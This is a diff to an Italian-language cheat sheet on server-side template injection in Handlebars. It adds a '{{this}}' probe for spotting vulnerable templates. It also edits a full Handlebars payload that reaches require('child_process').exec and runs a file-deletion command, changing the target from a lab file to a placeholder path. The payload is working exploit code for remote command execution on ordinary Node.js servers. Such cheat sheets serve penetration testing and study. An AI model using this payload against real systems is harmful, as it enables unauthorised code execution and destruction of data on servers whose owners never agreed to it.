@@ -31,6 +31,17 @@ ${{<%[%'"}}%\
 
 ## Handlebars
 ```
+{{this}}
+```
+Vulnerabile se ritorna:
+```
+[Object object]
+```
+
+
+- Oppure
+
+```
 Ciao, funziona!{{#with "s" as |string|}}
   {{#with "e"}}
     {{#with split as |conslist|}}
@@ -39,7 +50,7 @@ Ciao, funziona!{{#with "s" as |string|}}
       {{this.pop}}
       {{#with string.split as |codelist|}}
         {{this.pop}}
-        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+        {{this.push "return require('child_process').exec('rm /path/to/file.txt');"}}
         {{this.pop}}
         {{#each conslist}}
           {{#with (string.sub.apply 0 codelist)}}
